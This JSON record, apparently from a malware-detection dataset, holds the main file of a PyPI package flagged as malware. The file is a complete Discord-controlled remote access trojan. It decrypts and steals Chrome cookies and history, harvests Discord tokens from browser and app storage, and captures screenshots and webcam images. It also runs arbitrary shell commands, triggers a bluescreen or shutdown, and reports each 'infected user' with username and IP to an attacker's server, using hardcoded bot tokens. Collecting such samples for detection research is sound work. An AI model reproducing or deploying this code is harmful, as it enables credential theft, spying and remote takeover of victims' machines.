[
  {
    "pyfile": "__main__.py",
    "malicious_code_snippets": "from discord.ext import commands\nfrom PIL import ImageGrab\nimport subprocess\nimport time\nimport os\nimport io\nimport sqlite3\nimport ctypes\nimport discord\nimport shutil\nimport json\nimport base64\nimport win32crypt\nimport pycookiecheat\nimport getpass\nimport platform\nimport requests\nimport win32com.client as wincl\nimport ctypes\nimport re\nimport json\nimport socket\nimport colorama\nimport win32gui\nimport asyncio\nfrom colorama import init, Fore\nfrom urllib.request import urlopen\nimport logging\nfrom pathlib import Path\n\ninit()\n\nintents = discord.Intents.default()\nintents.members = True\nintents.message_content = True\nbot = commands.Bot(command_prefix='!', help_command=None, intents=intents)\n\nasync def run_bot():\n    await bot.start(\"OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY\")\n    hwnd = win32gui.FindWindow(None, \"window_title\")\n    win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)\n\ndef tahg(pene):\n    x = json.loads(open(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", \"r\", encoding=\"utf-8\").read())\n    try:\n        mk = win32crypt.CryptUnprotectData(base64.b64decode(x[\"os_crypt\"][\"encrypted_key\"])[5:], None, None, None, 0)[1]\n    except:\n        mk = \"\"\n    try:\n       return (AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])[:-16]).decode()\n    except:\n        return \"\"\n\n@bot.command()\nasync def getcookies(ctx):\n    get_chrome_cookies()\n    await ctx.send(file=discord.File(os.environ['TEMP'] + \"\\\\cookies.txt\"))\n    await ctx.send(\"[*] Command successfully executed\")\ndef get_chrome_cookies():\n    shutil.copyfile(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\", os.environ['TEMP'] + \"\\\\asd\")\n    con = sqlite3.connect(os.environ['TEMP'] + \"\\\\asd\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT host_key, name, value, encrypted_value FROM cookies\")\n    file = open(os.environ['TEMP'] + \"\\\\cookies.txt\", \"w+\")\n    for cookie in cursor.fetchall():\n        file.write(f\"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\\n\")\n    cursor.close()\n    con.close()\n    file.close()\n\n@bot.command()\nasync def screenshot(ctx):\n    image = ImageGrab.grab()\n    with io.BytesIO() as image_binary:\n        image.save(image_binary, 'PNG')\n        image_binary.seek(0)\n        file = discord.File(image_binary, filename='screenshot.png')\n        await ctx.send(file=file)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.event\nasync def on_ready():\n    guild_id = 1070633873374986271\n    guild = bot.get_guild(guild_id)\n    if guild is None:\n        print(f\"No se pudo encontrar un servidor con el ID {guild_id}\")\n        return\n    channel_name = os.getlogin()\n    channel = await guild.create_text_channel(channel_name)\n    system_info = f\"**OS**: {platform.system()} {platform.release()}\\n**CPU**: {platform.processor()}\"\n    ip_address = socket.gethostbyname(socket.gethostname())\n    embed = discord.Embed(title=\"Nuevo Usuario Infectado\", description=f\"**Usuario:** {channel_name}\\n**IP:** {ip_address}\", color=0x000000)\n    embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')\n    await channel.send(embed=embed)\n\n@bot.command()\nasync def shell(ctx, *args):\n    command = ' '.join(args)\n    try:\n        output = subprocess.check_output(command, shell=True).decode('cp1252')\n    except subprocess.CalledProcessError as e:\n        output = e.output.decode('cp1252')\n    embed = discord.Embed(title=\"Shell Output\", description=output)\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def history(ctx):\n    import sqlite3\n    import os\n    import time\n    import shutil\n    temp = (os.getenv('TEMP'))\n    Username = (os.getenv('USERNAME'))\n    shutil.rmtree(temp + r\"\\history12\", ignore_errors=True)\n    os.mkdir(temp + r\"\\history12\")\n    path_org = r\"\"\" \"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\" \"\"\".format(Username)\n    path_new = temp + r\"\\history12\"\n    copy_me_to_here = ((\"copy\" + path_org + \"\\\"{}\" ).format(path_new))\n    os.system(copy_me_to_here)\n    con = sqlite3.connect(path_new + r\"\\history\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT url FROM urls\")\n    urls = cursor.fetchall()\n    for x in urls:\n        done = (\"\".join(x))\n        f4 = open(temp + r\"\\history12\" + r\"\\history.txt\", 'a')\n        f4.write(str(done))\n        f4.write(str(\"\\n\"))\n        f4.close()\n    con.close()\n    file = discord.File(temp + r\"\\history12\" + r\"\\history.txt\", filename=\"history.txt\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n    def deleteme() :\n        path = \"rmdir \" + temp + r\"\\history12\" + \" /s /q\"\n        os.system(path)\n    deleteme()\n\n@bot.command()\nasync def wallpaper(ctx):\n    import ctypes\n    import os\n    path = os.path.join(os.getenv('TEMP') + r\"\\temp.jpg\")\n    await ctx.message.attachments[0].save(path)\n    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.command()\nasync def message(ctx, *args):\n    import ctypes\n    import time\n    MB_YESNO = 0x04\n    MB_HELP = 0x4000\n    ICON_STOP = 0x10\n    def mess():\n        ctypes.windll.user32.MessageBoxW(0, ' '.join(args), \"Error\", MB_HELP | MB_YESNO | ICON_STOP)\n    import threading\n    messa = threading.Thread(target=mess)\n    messa._running = True\n    messa.daemon = True\n    messa.start()\n    import win32con\n    import win32gui\n    def get_all_hwnd(hwnd,mouse):\n        def winEnumHandler(hwnd, ctx):\n            if win32gui.GetWindowText(hwnd) == \"Error\":\n                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  \n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                return None\n            else:\n                pass\n        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):\n            win32gui.EnumWindows(winEnumHandler,None)\n    await ctx.send(\"[*] Command successfully executed\")\n    win32gui.EnumWindows(get_all_hwnd, 0)\n\n@bot.command()\nasync def bluescreen(ctx):\n    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\n    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))\n\n@bot.command()\nasync def descargar(ctx, *args):\n    command = ' '.join(args)\n    try:\n        subprocess.check_call(command, shell=True)\n        subprocess.check_call(command, shell=True)\n        user = getpass.getuser()\n        embed = discord.Embed(title=f\"Descarga Exitosa ({user})\", color=0x00FF00, description=\"La descarga se completó correctamente en tu PC.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    except subprocess.CalledProcessError as e:\n        embed = discord.Embed(title=\"Error al Descargar\", color=0xFF0000, description=\"No se pudo completar la descarga. Revisa si ingresaste los comandos correctamente.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def cam(ctx):\n    ImageGrab.grab(bbox=(0,0,640,480)).save('camera.png', 'PNG')\n    await ctx.send(file=discord.File('camera.png'))\n\n@bot.command()\nasync def stop(ctx):\n    os.system(\"shutdown /s /t 1\")\n\ndef get_account_name(token):\n    headers = {\n        \"Authorization\": token,\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\"\n    }\n    try:\n        r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=headers)\n        return r.json()[\"username\"] + \"#\" + r.json()[\"discriminator\"]\n    except:\n        return \"Unknown\"\n\n@bot.command()\nasync def tokens(ctx):\n    paths = [\n        os.path.join(os.getenv(\"APPDATA\"), \".discord\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordcanary\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordptb\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome SxS\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera GX Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera\", \"Local Storage\", \"leveldb\"),\n    ]\n    tokens = []\n    for path in paths:\n        if not os.path.exists(path):\n            continue\n        for file in os.listdir(path):\n            if not file.endswith(\".log\") and not file.endswith(\".ldb\"):\n                continue\n            for line in [x.strip() for x in open(os.path.join(path, file), errors=\"ignore\").readlines() if x.strip()]:\n                for regex in [r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}\", r\"mfa\\.[\\w-]{84}\"]:\n                    for token in re.findall(regex, line):\n                        account_name = get_account_name(token)\n                        tokens.append((account_name, token))\n    if not tokens:\n        await ctx.send(\"No se encontraron tokens.\")\n    else:\n        embed = discord.Embed(title=\"Tokens encontrados:\", color=0xfafafa)\n        for token in tokens:\n            account_name = token[0]\n            token = token[1]\n            embed.add_field(name=account_name, value=f\"```{token}```\", inline=False)\n        await ctx.send(embed=embed)\n\n@bot.command()\nasync def voice(ctx):\n    volumeup()\n    speak = wincl.Dispatch(\"SAPI.SpVoice\")\n    speak.Speak(ctx.message.content[7:])\n    await ctx.send(\"[*] Command successfuly executed\")\n\ndef volumeup():\n    pass\n\n@bot.event\ndef on_command_error(ctx, error):\n    if isinstance(error, commands.CommandNotFound):\n        await ctx.send('El comando que ingresaste no existe. Inténtalo de nuevo.')\n\n@bot.command()\nasync def webcampic(ctx):\n    temp = os.getenv('TEMP')\n    cap = cv2.VideoCapture(0)\n    ret, frame = cap.read()\n    cv2.imwrite(temp + r\"\\temp.png\", frame)\n    cap.release()\n    with open(temp + r\"\\temp.png\", \"rb\") as image_file:\n        img = Image.open(io.BytesIO(image_file.read()))\n    img_byte_arr = io.BytesIO()\n    img.save(img_byte_arr, format='PNG')\n    img_byte_arr = img_byte_arr.getvalue()\n    file = discord.File(io.BytesIO(img_byte_arr), filename=\"temp.png\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n\nbot.run(\"OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4\")"
  },
  {
    "metadata": {
      "package_name": "sylexnaranjoo-1.0.6",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/sylexnaranjoo-1.0.6.txt"
    }
  }
]